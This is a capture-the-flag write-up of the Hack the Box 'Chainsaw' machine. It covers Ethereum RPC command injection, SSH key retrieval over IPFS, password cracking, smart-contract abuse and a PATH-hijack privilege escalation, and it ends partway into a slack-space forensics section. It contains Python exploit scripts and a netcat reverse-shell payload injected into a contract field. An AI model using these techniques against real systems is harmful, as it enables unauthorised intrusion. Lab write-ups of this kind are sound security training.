---
layout: article
title: Chainsaw Writeup
description: This article will demonstrate a new vector of attack using Blockchain tools, commencing from an initial CMD injection through Ethereum’s RPC interface, SSH keys retrieval using the IPFS protocol, privilege escalation by stealing funds from a smart contract, and file system forensics in the slack space storage.
category: writeup
modified: 2019-11-23
tags: [blockchain, ethereum, smart contracts, rpc, ipfs, slack space]
image:
    path: "/assets/images/chainsaw3.png"
---

<style>
.wrapper {
  max-width: 700px;
}
section {
  max-width: 700px;
  padding: 30px 0px 0px 0px;
}
pre, code {
    white-space: pre-wrap;
}
@media all and (max-width:480px) {
    img {float:center;display:block;margin:0 auto;}
}

@media all and (min-width:480px) {
    img {float:left;padding-right:30px;margin:0 auto;}
}
img {
    margin-bottom:8px;
}
</style>   

<i>**23 November, 2019** — [Go back to homepage](../) </i>
# Hack the Box / Chainsaw Writeup

<img style="margin-top:10px;" id="chainsaw1" width="300" height="285" src="/assets/images/chainsaw1.png">
### Technical Specifications
- **Operating System:** Linux
- **Static IP:** 10.10.10.142
- **Difficulty:** <span style="color:red;">Hard</span>
- **Key Words:** Ethereum RPC, IPFS, Slack Space

### Exploitation Phases
- [Information Gathering](#1-information-gathering)
- [Command Injection](#2-command-injection)
- [Local Enumeration](#3-local-enumeration)
- [Privilege Escalation](#4-privilege-escalation)
- [Forensics](#5-forensics)


## Executive Summary

This document contains written techniques to successfully exploit the "Chainsaw" box, commencing from a command injection through Ethereum's Remote Procedure Call (RPC) interface, using the InterPlanetary File System (IPFS) protocol to retrieve Secure Shell (SSH) private keys, followed by escalating to root shell through making a valid transaction to steal funds from a smart contract, and finally performing file system forensics to get the root flag hidden in slack space.

## 1. Information Gathering

As usually, we start with `nmap` to check which ports are open on the server:


{% highlight console %}
$ mkdir nmap
$ nmap -sC -oA nmap/initial 10.10.10.142 -p-
...
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1001     1001        23828 Dec 05 13:02 WeaponizedPing.json
| -rw-r--r--    1 1001     1001          243 Dec 12 23:46 WeaponizedPing.sol
|_-rw-r--r--    1 1001     1001           44 Dec 13 00:12 address.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh
| ssh-hostkey:
|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
9810/tcp open  unknown
...
{% endhighlight %}

There are three (3) services running in the box. The first interesting one is FTP running on port 21 which seems to have anonymous login enabled with the following files: _WeaponizedPing.json_, _WeaponizedPing.sol_, and _address.txt_. Moreover, besides SSH running on port 22 which has the password authentication mechanism disabled (implies key usage), there is one more unknown service running on port 9810 which `nmap` could not get fingerprint information from.

We will first download the public files using `ftp` with download confirmation prompt disabled _(-i):_
{% highlight console %}
$ ftp -i 10.10.10.142
ftp> mget *
ftp> exit
{% endhighlight %}

We commence by taking a look at _WeaponizedPing.sol:_

{% highlight java %}
pragma solidity ^0.4.24;

contract WeaponizedPing
{
        string store = "google.com";

        function getDomain() public view returns (string)
        {
            return store;
        }

        function setDomain(string _value) public
        {
            store = _value;
        }
}
{% endhighlight %}

The above source code seems to be written for Solidity version 0.4.24 that represents a simple smart contract built on top of the Ethereum technology. A contract in the sense of Solidity is a collection of code (its functions) and data (its state) that resides at a specific address on the blockchain. There are two functions implemented in the contract, <span style="color:#a6e22e;">getDomain()</span> which returns the value of the store variable (in this case, initial value is "_google.com_") and <span style="color:#a6e22e;">setDomain()</span> which allows you to override said value.

On the other hand, _WeaponizedPing.json_ holds the configuration file for the smart contract in the JSON format, and _address.txt_ the address value to uniquely identify the contract, generated by computer program, where storage can be fetched or set – in our case, a domain name.

Based on the functionality of the source code and its name, _WeaponizedPing_, which may or may not be a ping service to test if a domain or IP address is reachable, then we might look into command injection – which is common in these instances.

## 2. Command Injection

Visiting <a href="http://10.10.10.142:9810/">http://10.10.10.142:9810/</a> will simply output a HTTP bad request error code of 400. Taking into consideration information gathered from the reconnaissance process, the mention of blockchain technology and Ethereum on top of it may imply that port 9810 can be a potentially RPC interface to Ethereum clients – a service which became popular in 2017 due to the cryptocurrency publicity.

Our main objective is to gain the ability to modify and manipulate the domain value, and for that, we will develop a script in Python 3 to craft our request.

To interact with Ethereum, we will use the <a href="https://web3py.readthedocs.io/en/stable/">Web3</a> library (which can be installed using `pip`) and we will use <a href="https://www.sitepoint.com/compiling-smart-contracts-abi/">two essential elements</a>, besides contract’s address, from the configuration file provided:

* Ethereum bytecode for WeaponizedPing – The executable code of smart contract running on the stack-based Ethereum Virtual Machine (EVM);
* Application Binary Interface (ABI) – Which allows us to contextualize the contract and call its functions.

We will be using various functions from `Web3` to establish a connection with the RPC interface using `Web3.HTTPProvider`, load necessary values through `eth.defaultAccount` and finally the custom function `setDomain()` to override _“google.com”_ to _“hackthebox.eu”_:

{% highlight python %}
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import json, subprocess
import netifaces as ni
from web3 import Web3

def run_exploit(ip):
	# Store Ethereum contract address
	caddress = open('address.txt', 'r').read()
	caddress = caddress.replace('\n', '')

	# Load Ethereum contract configuration
	with open('WeaponizedPing.json') as f:
		contractData = json.load(f)

	# Establish a connection with the Ethereum RPC interface
	w3 = Web3(Web3.HTTPProvider('http://10.10.10.142:9810'))
	w3.eth.defaultAccount = w3.eth.accounts[0]

	# Get Application Binary Interface (ABI) and Ethereum bytecode
	Url = w3.eth.contract(abi=contractData['abi'],      
                       bytecode=contractData['bytecode'])
	contractInstance = w3.eth.contract(address=caddress,  
                                      abi=contractData['abi'])

	# Calling the function of contract to set a new domain
	url = \
         contractInstance.functions.setDomain('hackthebox.eu').transact()

if __name__ == '__main__':
	try:
		ni.ifaddresses('tun0')
		ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
	except:
		print('[*] Failed to fetch local IP address')

	run_exploit(ip)
{% endhighlight %}

To confirm our code is working, we will set our IP address as the domain value:

{% highlight python %}
url = contractInstance.functions.setDomain('{}'.format(ip)).transact()
{% endhighlight %}

And sure enough, a single ICMP request will appear in our `tcpdump`:

{% highlight console %}
$ tcpdump -i eth0 icmp
...
03:36:05.225134 IP 10.10.10.142 > 10.10.14.3: ICMP echo request, id 1, seq 96, length 40
03:36:05.225173 IP 10.10.14.3 > 10.10.10.142: ICMP echo reply, id 1, seq 96, length 40
...
{% endhighlight %}

This means that the software is most likely running a system command to `ping` once a retrieved value of the domain. Taking this fact into consideration, we can then inject arbitrary commands after the domain name through piping, such as using `netcat` (assuming it is installed in the box) to spawn a reverse shell:

{% highlight python %}
rl = contractInstance.functions.setDomain('hackthebox.eu | nc {} 9191 -e /bin/bash'.format(ip)).transact()

# Start netcat handler for reverse shell
subprocess.call(["nc -lvnp 9191"], shell=True, stderr=subprocess.STDOUT)
{% endhighlight %}

This will pop a shell as user _administrator_ in which no user flag is found, meaning that we need to continue with local enumeration.

Fully automated and formatted code for the exploit can be found in my <a href="https://gist.github.com/artikrh/b53ac84a65610084f7ddd8cd00546d0c">public gist</a>. As you may notice, the script also leverages `ftplib` to fetch the newly generated blockchain address each time the machine is reset; this is a detail quite a number of people had to learn the hard way:

{% highlight python %}
def getFiles():
	ftp = ftplib.FTP(TARGET_IP)
	ftp.login('anonymous', 'chainsaw')

	filenames = ftp.nlst()

	for filename in filenames:
		if os.path.exists(filename):
			os.remove(filename)
		file = open(filename, 'wb')
		ftp.retrbinary('RETR '+ filename, file.write)

		file.close()

	ftp.quit()
{% endhighlight %}

<u>Note</u>: You can also use the <a href="https://www.npmjs.com/package/web3">NodeJS Web3</a> or <a href="https://github.com/ethereum/go-ethereum/wiki/geth">geth</a> command line interface implemented in Go language to interact with the JSON RPC; the same result can be also achieved through `curl`:

{% highlight console %}
$ curl 10.10.10.142:9810 -X POST --data '{"jsonrpc":"2.0","method":"eth_call","params":[{"from": "0xa6bcc6ac459ad9d568f0d11365cd5541496bf008", "to": "0x4a3e40bb27f21d30d51f636f31b129c3c9956177", "data": "0xb68d1809"}, "latest"]}'

{"jsonrpc":"2.0","result":"0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002b31302e31302e31342e332026206e63202d6520272f62696e277368272031302e31302e31342e3320343433000000000000000000000000000000000000000000"}
{% endhighlight %}
## 3. Local Enumeration

By a quick overview of administrator’s home folder, we will notice a CSV file, a _maintain_ directory and a couple of hidden directories.

The CSV file holds information about Chainsaw employees with their usernames, role status, and role descriptions. It seems that only the user _bobby_, who is a smart contract auditor, is the only one active at the moment, and we can confirm this by his home directory presence in _/home_ and a valid Unix shell in _/etc/passwd_. In conclusion, we need to escalate to _bobby_ to grab the user flag.

The _maintain_ directory seems to contain employees public RSA keys (which were probably generated from the _gen.py_ script – which also generates encrypted private keys, except, they are the ones missing).

Furthermore, among hidden directories in which mostly have little to no value, _.ipfs_ is an interesting one which may give us necessary information to proceed further in this box. InterPlanetary File System (IPFS) is a peer-to-peer network protocol that utilizes distributed systems (including blockchain) with its main objective of hypermedia sharing.

With the aim of replacing HTTP, it is an open source project available on <a href="https://github.com/ipfs/ipfs">GitHub</a>, therefore, it is already available for installation in different systems, including Linux – where we can confirm its presence by issuing a simple <a href="https://docs.ipfs.io/reference/api/cli/">command</a> to retrieve our own peer information:

{% highlight console %}
$ ipfs id
{
        "ID": "QmPfaAfb157bVHC1Y3waMEkX5QHjrF5UrvHqcNdp4R1BGy",
        "PublicKey": "CAASpgIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDeME8+9MUmzPvifqnqC7dM4rtPfqOn4STLZxC5OgizeavrygOubfKosRdRkKNkm9DdNTsR5gB9QANiHkRnQ57bLwheH4o895Ib/lW/WOhwmOtks1iV9VIUj7DTnuQDNcN2IuVcnpC8x5HFQoNIgsj2HgqxLnlPCJboaTYo3oGwflqE2o2+/pwZjM2My3ux9FYCg7GhEpXO6WGpH6Jxq2Z3wOA1z1qVSOmAPSPgSOvvFGvKyfU6ntta8qd3EC15x4002CB9OSA/pTbchSTr3gS9QOMq5Wn55vEwNaOFNf/qOImaRWYER8epyHB/E4kKJ9XAeL7U7xfKpQDhrqvEdq2/AgMBAAE=",
        "Addresses": null,
        "AgentVersion": "go-ipfs/0.4.18/",
        "ProtocolVersion": "ipfs/0.1.0"
}
{% endhighlight %}

In IPFS, every link/file is identified with a unique hash. However, as seen from the process list, IPFS daemon is not running which means that it is only running locally.

To list all objects stored in the local IPFS repository, we will use the following command:

{% highlight console %}
$ ipfs refs local
QmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5Y
QmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAx
QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB
QmdL9t1YP99v4a2wyXFYAQJtbD9zKnPrugFLQWXBXb82sn
QmSKboVigcD3AY4kLsob117KJcMHvMUu6vNFqk1PQzYUpp
...
QmZZRTyhDpL5Jgift1cHbAhexeE1m2Hw8x8g7rTcPahDvo
QmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRS
QmcMCDdN1qDaa2vaN654nA4Jzr6Zv9yGSBjKPk26iFJJ4M
QmPZ9gcCEpqKTo6aq61g2nXGUhM4iCL3ewB6LDXZCtioEB
Qmc7rLAhEh17UpguAsEyS4yfmAbeqSeSEz4mZZRNcW52vV
{% endhighlight %}

These objects could be either files or directories. To skip a lot of unnecessary output that the files might have, we will try to list (`ipfs ls`) information about these hashes.

{% highlight console %}
$ for i in $(ipfs refs local); do ipfs ls $i 2> /dev/null; done;
QmXWS8VFBxJPsxhF8KEqN1VpZf52DPhLswcXpxEDzF5DWC 391 arti.key.pub
QmPjsarLFBcY8seiv3rpUZ2aTyauPF3Xu3kQm56iD6mdcq 391 bobby.key.pub
QmUHHbX4N8tUNyXFK9jNfgpFFddGgpn72CF1JyNnZNeVVn 391 bryan.key.pub
QmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRS 391 lara.key.pub
QmcMCDdN1qDaa2vaN654nA4Jzr6Zv9yGSBjKPk26iFJJ4M 391 wendy.key.pub
QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri 45459 mail-log/
QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB 10063 artichain600-protonmail-2018-12-13T20_50_58+01_00.eml
QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 4640  bobbyaxelrod600-protonmail-2018-12-13-T20_28_54+01_00.eml
QmZxzK6gXioAUH9a68ojwkos8EaeANnicBJNA3TND4Sizp 10084 bryanconnerty600-protonmail-2018-12-13T20_50_36+01_00.eml
QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1 10083 laraaxelrod600-protonmail-2018-12-13T20_49_35+01_00.eml
QmXwXzVYKgYZEXU1dgCKeejT87Knw9nydGcuUZrjwNb2Me 10092 wendyrhoades600-protonmail-2018-12-13T20_50_15+01_00.eml
QmZTR5bcpQD7cFgTorqxZDYaew1Wqgfbd2ud9QqGPAkK2V 1688 about
QmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5Y 200  contact
QmY5heUM5qgRubMDD1og9fhCPA6QdkMp3QCwd4s7gJsyE7 322  help
QmejvEPop4D7YUadeGqYWmZxHhLc4JBUCzJJHWMzdcMe2y 12   ping
QmXgqKTbzdh83pQtKFb19SpMCpDDcKR2ujqk3pKph9aCNF 1692 quick-start
QmPZ9gcCEpqKTo6aq61g2nXGUhM4iCL3ewB6LDXZCtioEB 1102 readme
QmQ5vhrL7uv6tuoN9KeVBwd4PwfQkXdVVmDLUZuTNxqgvm 1173 security-notes
QmWMuEvh2tGJ1DiNPPoN6rXme2jMYUixjxsC6QUji8mop8 2996 maintain/
QmXymZCHdTHz5BA5ugv9MQTBtQAb6Vit4iFeEnuRj6Udrh 660  gen.py
QmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAx 2237 pub/
QmYn3NxLLYA6xU2XL1QJfCZec4B7MpFNxVVtDvqbiZCFG8 231 chainsaw-emp.csv
{% endhighlight %}

We see a bunch of files and directories, some which are already familiar from administrator’s home directory. However, there is an extra directory, _mail-log_, which seems to have a couple of EML (email message) files. They must be emails previously sent to the employees which are stored in blockchain at the moment. Since our target user is _bobby_, we will try to print the content of _bobbyaxelrod600-protonmail-2018-12-13-T20_28_54+01_00.eml_ hash:

{% highlight console %}
$ ipfs cat QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF
{% endhighlight %}

The resulting content will display information about both email message header and email content which was sent from _chainsaw_admin@protonmail.ch_ to _bobbyaxelrod600@protonmail.ch_. The body part consists of a body message and an attachment included in the email – both encoded in Base64 by the email program (ProtonMail).

An alternative way would be to recursively grep for keywords such as “protonmail” to find the relevant chunk of data from _/home/bobby/.ipfs/blocks/BLOCKID/CHUNKID.data_.

Body message (decoded):
{% highlight matlab %}
Bobby,
I am writing this email in reference to the method on how we access our Linux server from now on. Due to security reasons, we have disabled SSH password authentication and instead we will use private/public key pairs to securely and conveniently access the machine.
Attached you will find your personal encrypted private key. Please ask the reception desk for your password, therefore be sure to bring your valid ID as always.
Sincerely,
IT Administration Department
{% endhighlight %}

Attachment “bobby.key.enc” (decoded):

{% highlight matlab %}
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,53D881F299BA8503
SeCNYw/BsXPyQq1HRLEEKhiNIVftZagzOcc64ff1IpJo9IeG7Z/zj+v1dCIdejuk
7ktQFczTlttnrIj6mdBb6rnN6CsP0vbz9NzRByg1o6cSGdrL2EmJN/eSxD4AWLcz
n32FPY0VjlIVrh4rjhRe2wPNogAciCHmZGEB0tgv2/eyxE63VcRzrxJCYl+hvSZ6
fvsSX8A4Qr7rbf9fnz4PImIgurF3VhQmdlEmzDRT4m/pqf3TmGAk9+wriqnkODFQ
I+2I1cPb8JRhLSz3pyB3X/uGOTnYp4aEq+AQZ2vEJz3FfX9SX9k7dd6KaZtSAzqi
w981ES85Dk9NUo8uLxnZAw3sF7Pz4EuJ0Hpo1eZgYtKzvDKrrw8uo4RCadx7KHRT
inKXduHznGA1QROzZW7xE3HEL3vxR9gMV8gJRHDZDMI9xlw99QVwcxPcFa31AzV2
yp3q7yl954SCMOti4RC3Z4yUTjDkHdHQoEcGieFOWU+i1oij4crx1LbO2Lt8nHK6
G1Ccq7iOon4RsTRlVrv8liIGrxnhOY295e9drl7BXPpJrbwso8xxHlT3333YU9dj
hQLNp5+2H4+i6mmU3t2ogToP4skVcoqDlCC+j6hDOl4bpD9t6TIJurWxmpGgNxes
q8NsAentbsD+xl4W6q5muLJQmj/xQrrHacEZDGI8kWvZE1iFmVkD/xBRnwoGZ5ht
DyilLPpl9R+Dh7by3lPm8kf8tQnHsqpRHceyBFFpnq0AUdEKkm1LRMLAPYILblKG
jwrCqRvBKRMIl6tJiD87NM6JBoQydOEcpn+6DU+2Actejbur0aM74IyeenrGKSSZ
IZMsd2kTSGUxy9o/xPKDkUw/SFUySmmwiqiFL6PaDgxWQwHxtxvmHMhL6citNdIw
TcOTSJczmR2pJxkohLrH7YrS2alKsM0FpFwmdz1/XDSF2D7ibf/W1mAxL5UmEqO0
hUIuW1dRFwHjNvaoSk+frAp6ic6IPYSmdo8GYYy8pXvcqwfRpxYlACZu4Fii6hYi
4WphT3ZFYDrw7StgK04kbD7QkPeNq9Ev1In2nVdzFHPIh6z+fmpbgfWgelLHc2et
SJY4+5CEbkAcYEUnPWY9SPOJ7qeU7+b/eqzhKbkpnblmiK1f3reOM2YUKy8aaleh
nJYmkmr3t3qGRzhAETckc8HLE11dGE+l4ba6WBNu15GoEWAszztMuIV1emnt97oM
ImnfontOYdwB6/2oCuyJTif8Vw/WtWqZNbpey9704a9map/+bDqeQQ41+B8ACDbK
WovsgyWi/UpiMT6m6rX+FP5D5E8zrYtnnmqIo7vxHqtBWUxjahCdnBrkYFzl6KWR
gFzx3eTatlZWyr4ksvFmtobYkZVAQPABWz+gHpuKlrqhC9ANzr/Jn+5ZfG02moF/
edL1bp9HPRI47DyvLwzT1/5L9Zz6Y+1MzendTi3KrzQ/Ycfr5YARvYyMLbLjMEtP
UvJiY40u2nmVb6Qqpiy2zr/aMlhpupZPk/xt8oKhKC+l9mgOTsAXYjCbTmLXzVrX
15U210BdxEFUDcixNiwTpoBS6MfxCOZwN/1Zv0mE8ECI+44LcqVt3w==
-----END RSA PRIVATE KEY-----
{% endhighlight %}

Now that we managed to grab the private RSA key for user _bobby_, we need to decrypt it since it is protected with a passphrase (using triple DES as the encryption algorithm with CBC mode). We will use `ssh2john` to extract the hash, and `john` to brute force the value (which will eventually give us the password _"jackychain"_):

{% highlight console %}
$ ssh2john bobby.key.enc > bobby-hash.txt
$ john bobby-hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
...
jackychain       (bobby.key.enc)
1g 0:00:05:53 DONE (2018-12-13 23:04) 0.002828g/s 20435p/s 20435c/s 20435C/s jackychain
...
$ openssl rsa -in bobby.key.enc -out bobby.key -passin pass:jackychain
$ ssh -i bobby.key bobby@10.10.10.142
{% endhighlight %}

After logging in, we get the user flag (_af8d9d..._).

## 4. Privilege Escalation

After we SSH in as _bobby_, we notice the following folders in his home directory:

  • _projects_ – contains a folder named _ChainsawClub_ which bobby is working in;  
  • _resources_ – contains some PDFs for the IPFS protocol (not important).

There is yet another smart contract in the _ChainsawClub_ project, this time it is longer in code and seems to make credit transactions. Besides the smart contract _(ChainsawClub.sol)_, there is its configuration file _(ChainsawClub.json)_ and a binary file with sticky bit set. Running it will generate a new Ethereum address in the current working directory and will ask for credentials (banner will show we need to create a user first), so that is why we start analyzing the code of the contract to get a better understanding.

{% highlight java %}
pragma solidity ^0.4.22;

contract ChainsawClub {
        string username = 'nobody';
        string password = '7b455ca1ffcb9f3828cfdde4a396139e';
        bool approve = false;
        uint totalSupply = 1000;
        uint userBalance = 0;

        function getUsername() public view returns (string) {
            return username;
        }
        function setUsername(string _value) public {
            username = _value;
        }
        function getPassword() public view returns (string) {
            return password;
        }
        function setPassword(string _value) public {
            password = _value;
        }
        function getApprove() public view returns (bool) {
            return approve;
        }
        function setApprove(bool _value) public {
            approve = _value;
        }
        function getSupply() public view returns (uint) {
            return totalSupply;
        }
        function getBalance() public view returns (uint) {
            return userBalance;
        }
        function transfer(uint _value) public {
            if (_value > 0 && _value <= totalSupply) {
                totalSupply -= _value;
                userBalance += _value;
            }
        }
        function reset() public {
            username = '';
            password = '';
            userBalance = 0;
            totalSupply = 1000;
            approve = false;
        }
}
{% endhighlight %}

We notice a bunch of getters and setters by breaking down the code:

1. <span style="color:#a6e22e;">setUsername()</span> and <span style="color:#a6e22e;">setPassword()</span> which allows us to basically create a ‘new’ account;
2. <span style="color:#a6e22e;">setApprove()</span> to possibly approve the user. Default is false so we may need to overwrite;
3. <span style="color:#a6e22e;">getSupply()</span> to get total supply from the application and <span style="color:#a6e22e;">getBalance()</span> to get user balance;
4. <span style="color:#a6e22e;">transfer()</span> which actually performs a simple, logical transaction;
5. <span style="color:#a6e22e;">reset()</span> which resets all variable to default values.

For the exploit development part, we need to use the `Web3` library again to interact with the Ethereum interface, however, this time we do not have any information with reference to another RPC interface within the box. If we check the `ChainsawClub` binary shared object dependencies using `ldd`, we can notice an unusual preloaded library named _chainsaw.so_ before default system objects are invoked:   

{% highlight console %}
$ ldd ChainsawClub
        linux-vdso.so.1 (0x00007fff708b0000)
        /usr/$LIB/chainsaw.so => /usr/lib/x86_64-linux-gnu/chainsaw.so (0x00007f351569b000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f35154a8000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f35154a2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f35156a8000)
{% endhighlight %}

Since we are using 64-bit ELF files, the _$LIB_ variable will expand to _lib/x86_64-linux-gnu/_ in our Debian case. If we disassemble the _chainsaw.so_ binary, we will first notice hardcoded declared variables:

<img src="/assets/images/chainsaw3.png">

What stands out is that "_process_to_filter_" has a value of the string "_node_" which is later referenced in the following procedure:

{% highlight cpp %}
int readdir64(int arg0) {
    var_228 = arg0;
    if (*original_readdir64 == 0x0) {
            *original_readdir64 = dlsym(0xffffffffffffffff, "readdir");
            if (*original_readdir64 == 0x0) {
                    fprintf(**qword_3ff8, "Error in dlsym: %s\n", dlerror());
            }
    }
    do {
            var_218 = original_readdir64(var_228);
            if (var_218 == 0x0) {
                break;
            }
            rax = get_dir_name(var_228, &var_210, 0x100);
            if (rax == 0x0) {
                break;
            }
            rax = strcmp(&var_210, "/proc");
            if (rax != 0x0) {
                break;
            }
            rax = get_process_name(var_218 + 0x13, &var_110);
            if (rax == 0x0) {
                break;
            }
            rax = strcmp(&var_110, *process_to_filter);
            if (rax != 0x0) {
                break;
            }
    } while (true);
    rax = var_218;
    rcx = *0x28 ^ *0x28;
    if (rcx != 0x0) {
            rax = __stack_chk_fail();
    }
    return rax;
}

{% endhighlight %}

The logic is fairly simple – the structure makes use of two functions by iterating the <span style="color:#a6e22e;">get_dir_name()</span> function which returns a relevant directory name given the _DIR*_ handle, and <span style="color:#a6e22e;">get_process_name()</span> that finds the correct process name given a _PID_ number used in _/proc/PID_. The process is basically overriding libc's <span style="color:#a6e22e;">readdir()</span> function so that everytime the _/proc/PID_ directory is read from a binary (which by default loads this shared library before the normal system's ones), the access to that specific PID belonging to _process_to_filter_ is skipped/blocked.

Simply put, any process initiated with "_node_" is not shown in our typical process listing tools such as `ps`. Consequently, we do not know the port number the RPC uses since `ganache-cli` uses `node`. However, if we check ports listening internally within the machine using `netstat`, we will see a queer port number of 63991. We can only assume that it belongs to Ethereum RPC for now.

{% highlight console %}
$ netstat -punta | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:9810            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:63991         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   
{% endhighlight %}

Moving on, we will develop another script to try and interact with the higher port number – and indeed, confirm that it is an RPC interface. To summarize the exploit script, which needs quite some attempts to get it right through playing around contract’s functions, we need to fulfill four conditions:

1. Set a new username and password. Default values equal to blank, which the program returns a _“Blank credentials not allowed”_
2. Match the credentials from the smart contract, otherwise you get a _“Wrong credentials”_ message
3. Approve our user since the program was returning a _“User is not approved”_ message
4. Transfer enough (all) funds from supply to our user’s balance in order to enter the club (root shell), otherwise you get a _“Not enough funds”_ message

{% highlight python %}
#!/usr/bin/python3
# -*- coding: utf-8 -*-
from web3 import Web3
import json, hashlib

def enter_club():
    # Store Ethereum contract address
    with open("/home/bobby/projects/ChainsawClub/address.txt",'r') as f:
        caddress = f.read().rstrip()
        f.close()

    # Load Ethereum contract configuration
    with open('/home/bobby/projects/ChainsawClub/ChainsawClub.json') as f:
        contractData = json.load(f)
        f.close()

    # Establish a connection with the Ethereum RPC interface
    w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:63991'))
    w3.eth.defaultAccount = w3.eth.accounts[0]

    # Get Application Binary Interface (ABI) and Ethereum bytecode
    Url = w3.eth.contract(abi=contractData['abi'],
                          bytecode=contractData['bytecode'])
    contractInstance = w3.eth.contract(address=caddress,
                                       abi=contractData['abi'])

    # Phase I & II: Create a new account and confirm
    username = "artikrh"
    password = hashlib.md5()
    password.update("arti".encode('utf-8'))
    password = password.hexdigest()
    contractInstance.functions.setUsername(username).transact()
    contractInstance.functions.setPassword(password).transact()
    cusername = contractInstance.functions.getUsername().call()
    cpassword = contractInstance.functions.getPassword().call()
    print("[*] Added user: {}".format(cusername))
    print("[*] Password (MD5): {}".format(cpassword))

    # Phase III: Approve our user and confirm
    contractInstance.functions.setApprove(True).transact()
    approvalStatus = contractInstance.functions.getApprove().call()
    print("[*] Approval status: {}".format(approvalStatus))

    # Phase IV: Transfer needed funds of value 1000 and confirm
    contractInstance.functions.transfer(1000).transact()
    supply = contractInstance.functions.getSupply().call()
    balance = contractInstance.functions.getBalance().call()
    print("[*] Supply left: {}".format(supply))
    print("[*] Total balance: {}".format(balance))

if __name__ == "__main__":
    enter_club()
{% endhighlight %}

The result is seen in the following picture:

<img src="/assets/images/chainsaw2.png">

Properly formatted code for privilege escalation can be found in my <a href="https://gist.github.com/artikrh/91501a98be44cbe54e62831e1c579ef7">public gist</a>.

<u>Note</u>: It is also worth stating that there is a unintended solution for escalation in root shell through path hijacking. If we open the SUID file with `radare2`, we will notice that the program runs _/root/ChainsawClub/dist/ChainsawClub/ChainsawClub_ with `sudo` privileges:

{% highlight c %}
[0x00001060]> pdf@main
/ (fcn) main 33
|   int main (int argc, char **argv, char **envp);
|           ; DATA XREF from entry0 @ 0x107d
|           0x00001145      55             push rbp
|           0x00001146      4889e5         mov rbp, rsp
|           0x00001149      bf00000000     mov edi, 0
|           0x0000114e      e8edfeffff     call sym.imp.setuid
|           0x00001153      488d3dae0e00.  lea rdi, qword str.sudo__i__u_root__root_ChainsawClub_dist_ChainsawClub_ChainsawClub ; 0x2008 ; "sudo -i -u root /root/ChainsawClub/dist/ChainsawClub/ChainsawClub" ; const char *string
|           0x0000115a      e8d1feffff     call sym.imp.system         ; int system(const char *string)
|           0x0000115f      b800000000     mov eax, 0
|           0x00001164      5d             pop rbp
\           0x00001165      c3             ret
{% endhighlight %}

Since `sudo` is lacking the full path of _/usr/bin/sudo_, we can make a custom file/script in the current directory called "_sudo_" – for which the program will run with root privileges; since the first path lookup is always the current working directory.

{% highlight console %}
$ cat << EOF > sudo && chmod +x ./sudo && ./ChainsawClub
#!/bin/bash
/bin/bash
EOF
{% endhighlight %}

## 5. Forensics

After we get a root shell, if we print the content of _root.txt_ we will get the following:

{% highlight console %}
# cat root.txt
Mine deeper to get rewarded with root coin (RTC)...
{% endhighlight %}

That means that our work is not done yet and that we need further enumeration within the box. One of the last resorts after we run out of options for low hanging fruits, is to check default binaries paths in case there is an interesting program installed or programmed in the machine.

I usually list items based in reverse modified date and time since the default installed binaries are usually the oldest and not much of an interest. In the _/sbin_ directory, we can notice an unusual program called `bmap`:

{% highlight console %}
# ls -ltr --group-directories-first /sbin
...
-rwxr-xr-x 1 root root     63824 Nov 30 23:01 bmap
...
{% endhighlight %}

A google search about it will bring results related to a generic tool for creating the block map for a file or copying files using the block map, and digital forensics. In simple terms from operating system concepts, blocks are specific sized containers used by file system to store data. Blocks can also be defined as the smallest pieces of data that a file system can use to store information. Files can consist of a single or multiple block in order to fulfill the size requirements of the file.

When data is stored in these blocks, two mutually exclusive conditions can occur:

* The block is completely full – most optimal situation for the file system has occurred
* The block is partially full – in which the area between the end of file content and the end of the container is referred to as slack space (in other words, null data)

